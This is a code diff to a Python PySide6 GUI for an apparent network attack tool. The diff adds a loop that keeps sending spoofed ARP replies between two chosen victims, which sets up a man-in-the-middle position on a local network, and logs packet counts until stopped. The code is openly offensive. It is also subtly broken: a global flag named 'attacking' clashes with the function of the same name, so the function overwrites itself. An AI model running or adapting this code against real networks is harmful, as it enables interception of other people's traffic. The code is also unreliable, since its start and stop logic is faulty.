@@ -4,12 +4,13 @@ from PySide6.QtUiTools import QUiLoader
 from PySide6.QtWidgets import QApplication, QPushButton, QListWidgetItem
 from PySide6.QtCore import QFile, QIODevice, QObject, Slot, Signal, QRunnable, QThreadPool
 from networkScanner.networkScanner import scanner
-from manInTheMiddle.script import startSpoof, stopSpoof
+from manInTheMiddle.script import stopSpoof, spoofer
 
 
 # Global variables
 targets = []
 scanning = False
+attacking = True
 
 class WorkerSignals(QObject):
 
@@ -49,10 +50,22 @@ class Worker(QRunnable):
 
 # Functions to start and stop attacking 
 def attacking(name) :
+    global attacking
+    attacking = True
     if (name == "ARP spoofing") :
         victim1IP,victim1Mac = targets[0].split(" : ")
         victim2IP,victim2Mac = targets[1].split(" : ")
-        startSpoof(victim1IP,victim2IP,victim1Mac)
+        packets = 0
+        while (attacking) :
+            spoofer(victim1IP,victim2IP,victim1Mac)
+            spoofer(victim2IP,victim1IP,victim1Mac)
+            printed = "[+] Sent packets "+ str(packets)
+            print(printed)
+            window.console.append(printed)
+            sys.stdout.flush()
+            packets +=2
+            time.sleep(2)
+        print("End attacking")
 
 def stopAttacking(name) :
     if (name == "ARP spoofing") :
@@ -173,12 +186,14 @@ if __name__ == "__main__":
             window.console.append(attackName + " attack stopped")
             #stopAttacking(attackName)
             
-            window.threadpool.stop(startAttackThread)
+            global attacking
+            attacking = False
+
             stopAttackThread = Worker(stopAttacking, attackName)
             stopAttackThread.signals.result.connect(stoppingAttack_output)
             stopAttackThread.signals.finished.connect(stoppingAttack_complete)
 
-            window.threadpool.start(stopAttackThread)
+            window.threadpool.start(stopAttackThread)            
 
         else :
             window.console.append("You should start the attack first")
